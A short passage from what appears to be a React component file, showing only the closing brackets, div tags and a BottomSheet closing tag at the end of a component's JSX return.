            ))}
          </div>
        </div>
      </BottomSheet>
    </div>
  );
}
